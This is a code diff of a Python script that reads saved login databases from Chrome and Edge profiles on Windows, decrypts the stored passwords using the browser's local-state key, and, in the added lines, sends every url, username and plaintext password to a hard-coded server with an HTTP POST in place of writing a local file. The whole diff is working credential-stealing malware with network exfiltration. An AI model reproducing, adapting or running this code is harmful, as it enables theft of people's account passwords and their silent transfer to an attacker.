@@ -1,21 +1,17 @@
 #Full Credits to LimerBoy
 import os
 import re
-import sys
 import json
 import base64
 import sqlite3
 import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
-import csv
-import json
+import requests
 
-#GLOBAL CONSTANT
-CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
-CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data"%(os.environ['USERPROFILE']))
+IP = "http://192.168.1.7:5000"
 
-def get_secret_key():
+def get_secret_key(CHROME_PATH_LOCAL_STATE):
     try:
         #(1) Get secretkey from chrome local state
         with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
@@ -67,17 +63,17 @@ def get_db_connection(chrome_path_login_db):
 if __name__ == '__main__':
     try:
         #Create Dataframe to store passwords
-        with open('decrypted_password.json', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
-            #csv_writer = csv.writer(decrypt_password_file, delimiter=',')
-            #csv_writer.writerow(["index","url","username","password"])
-            json_file = {"root": []}
+        json_data = {"root": []}
+        paths = [{"CHROME_PATH_LOCAL_STATE": os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])), "CHROME_PATH": os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))},{"CHROME_PATH_LOCAL_STATE": os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE'])), "CHROME_PATH": os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data"%(os.environ['USERPROFILE']))}]
+        print(paths)
+        for i in range (2):
             #(1) Get secret key
-            secret_key = get_secret_key()
+            secret_key = get_secret_key(paths[i]["CHROME_PATH_LOCAL_STATE"])
             #Search user profile or default folder (this is where the encrypted login password is stored)
-            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
+            folders = [element for element in os.listdir(paths[i]["CHROME_PATH"]) if re.search("^Profile*|^Default$",element)!=None]
             for folder in folders:
-            	#(2) Get ciphertext from sqlite database
-                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
+                #(2) Get ciphertext from sqlite database
+                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(paths[i]["CHROME_PATH"],folder))
                 conn = get_db_connection(chrome_path_login_db)
                 if(secret_key and conn):
                     cursor = conn.cursor()
@@ -96,16 +92,14 @@ if __name__ == '__main__':
                             #(5) Save into CSV 
                             #csv_writer.writerow([index,url,username,decrypted_password])
                             temp = {"index": index, "url": url, "username": username,"decrypt_password": decrypted_password}
-                            json_file["root"].append(temp)
+                            json_data["root"].append(temp)
                     #Close database connection
                     cursor.close()
                     conn.close()
                     #Delete temp login db
                     os.remove("Loginvault.db")
-                    print(json_file)
-                    with open("test.json", "w") as json_file_real:
-                        js = json.dumps(json_file)
-                        json_file_real.write(js)
+        requests.post(IP, json = json_data)
+                    
 
     except Exception as e:
         print("[ERR] "%str(e))
